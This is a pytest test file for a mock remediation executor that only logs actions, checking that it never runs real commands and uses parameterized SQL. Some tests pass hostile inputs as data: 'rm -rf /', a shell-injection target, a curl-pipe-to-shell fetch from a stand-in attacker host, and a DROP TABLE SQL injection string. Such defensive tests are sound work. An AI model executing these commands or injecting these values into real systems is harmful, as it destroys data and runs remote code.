"""Unit tests for remediation_log.py — the mock remediation executor.

Each test points remediation_log.DB_PATH at a fresh temp file so tests
never touch (or depend on) the real remediation_log.db.
"""

import os
import subprocess
import sys
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import remediation_log


def _use_temp_db(tmp_path, monkeypatch):
    monkeypatch.setattr(remediation_log, "DB_PATH", tmp_path / "test_remediation_log.db")
    remediation_log.init_db()


def test_run_remediation_returns_expected_fields(tmp_path, monkeypatch):
    _use_temp_db(tmp_path, monkeypatch)

    result = remediation_log.run_remediation("restart_service", "web-prod-cluster-03")

    assert result["status"] == "simulated"
    assert result["action"] == "restart_service"
    assert result["target"] == "web-prod-cluster-03"
    assert "web-prod-cluster-03" in result["message"]
    assert "no real command" in result["note"].lower()
    assert result["id"] is not None
    assert result["created_at"]  # non-empty ISO timestamp


def test_never_calls_subprocess_or_os_system(tmp_path, monkeypatch):
    """Regression guard: run_remediation must stay a pure log write.

    Patches subprocess.run/Popen and os.system to raise if called at
    all, then runs a handful of "dangerous-looking" actions through the
    tool to confirm none of them trigger real execution.
    """
    _use_temp_db(tmp_path, monkeypatch)

    def _boom(*args, **kwargs):
        raise AssertionError("run_remediation must never execute a real command")

    with patch.object(subprocess, "run", side_effect=_boom), \
         patch.object(subprocess, "Popen", side_effect=_boom), \
         patch.object(os, "system", side_effect=_boom):
        remediation_log.run_remediation("restart_service", "web-prod-cluster-03")
        remediation_log.run_remediation("rm -rf /", "web-prod-cluster-03")
        remediation_log.run_remediation("shutdown -h now", "; echo pwned")
        remediation_log.run_remediation("$(curl evil.example/x | sh)", "target")


def test_multiple_calls_all_persisted(tmp_path, monkeypatch):
    _use_temp_db(tmp_path, monkeypatch)

    first = remediation_log.run_remediation("restart_service", "host-a")
    second = remediation_log.run_remediation("clear_disk_space", "host-b")

    assert second["id"] > first["id"]

    conn = remediation_log._connect()
    try:
        count = conn.execute("SELECT COUNT(*) FROM remediation_log").fetchone()[0]
    finally:
        conn.close()
    assert count == 2


def test_empty_action_and_target_do_not_crash(tmp_path, monkeypatch):
    _use_temp_db(tmp_path, monkeypatch)

    result = remediation_log.run_remediation("", "")
    assert result["status"] == "simulated"


def test_sql_special_characters_do_not_corrupt_table(tmp_path, monkeypatch):
    """action/target go through parameterized SQL, so SQL-injection-shaped
    input should just be logged verbatim, not executed as SQL."""
    _use_temp_db(tmp_path, monkeypatch)

    payload = "'; DROP TABLE remediation_log; --"
    result = remediation_log.run_remediation(payload, "host-a")
    assert result["action"] == payload

    conn = remediation_log._connect()
    try:
        count = conn.execute("SELECT COUNT(*) FROM remediation_log").fetchone()[0]
    finally:
        conn.close()
    assert count == 1  # table still exists and has our one row


def test_init_db_is_idempotent(tmp_path, monkeypatch):
    _use_temp_db(tmp_path, monkeypatch)
    remediation_log.run_remediation("restart_service", "host-a")
    remediation_log.init_db()  # calling again shouldn't wipe existing rows

    conn = remediation_log._connect()
    try:
        count = conn.execute("SELECT COUNT(*) FROM remediation_log").fetchone()[0]
    finally:
        conn.close()
    assert count == 1
